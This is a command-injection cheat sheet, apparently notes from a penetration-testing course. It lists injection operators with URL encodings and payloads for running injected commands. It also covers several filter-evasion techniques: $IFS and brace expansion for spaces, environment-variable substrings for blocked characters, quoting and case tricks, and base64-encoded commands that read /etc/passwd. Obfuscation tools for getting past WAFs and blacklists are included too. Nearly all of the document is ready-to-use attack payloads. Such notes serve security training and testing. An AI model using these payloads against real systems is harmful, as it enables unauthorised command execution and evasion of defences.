#### PHP Dangerous Functions
- exec
- system
- shell_exec
- passtrhu
- popen
#### NodeJS Dangerous Functions
- child_process.exec
- child_process.spawn

## Injections Methods

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |
## Bypassing Front End Validation

Use Burp to send the request or remove the JavaScript responsible for this check

## Simple Injection

```bash
ping -c 1 127.0.0.1 && whoami
ping -c 1 || whoami #Make the first command fail to execute the second one
ping -c 1 127.0.0.1 ; whoami
```

## Identifying Filters
`If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`

Let us check the payload we sent:
```bash
127.0.0.1; whoami
```
Other than the IP (which we know is not blacklisted), we sent:
1. A semi-colon character `;`
2. A space character
3. A `whoami` command
So, the web application either `detected a blacklisted character` or `detected a blacklisted command`, or both. So, let us see how to bypass each.

## Bypassing Space Filters

###### 1. Using New Line
```
%0d%0a
```
###### 2. Using Tabs
###### 3. Using $IFS
```shell
127.0.0.1%0a${IFS}
```
###### 4. Using Brace Expansion
```shell
{ls,-la}
```

## Bypassing Other Blacklisted Characters
#### Linux
```shell
echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

```shell
echo ${PATH:0:1}

/
```

Use github.com/Vicente118/Substring-Expansion-Generator/ with right ENV file.
```
127.0.0.1${LS_COLORS:10:1}${IFS}
```

#### Windows
The same concept works on Windows as well.
For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users
\htb-student), and then specify a starting position (~6 -> \htb-student), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (-11 ->) :

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```
Formula for 1 specific character: ~CharPosition, -(LenVar - CharPosition - 1)%

With PowerShell, a word is considered an array, so we have to specify the index of the character we need.
```powershell
PS C:\htb> $env:HOMEPATH[0]

\
```
#### Linux character shifting

---
## Bypassing Blacklisted Commands
#### Linux & Windows
```shell
w'h'o'am'i
w"h"o"am"i
```
#### Linux
```bash
# In addition of InjectGen.py
who$@ami
w\ho\am\i

# More advanced
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
$(rev<<<'imaohw')

# Encoded Commands
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# find /usr/share/ | grep root | grep mysql | tail -n 1
# tail -n 1< <(grep root < <(grep mysql < <(find /usr/share/ )))
```

#### Windows 
CMD:
```cmd
who^ami
```
Powershell:
```powershell
PS C:\htb> WhOaMi
```

```shell
echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA

PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

## Evasion Tools
#### Linux
```shell
./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```
#### Windows
```powershell
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help
```

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%Sys
```


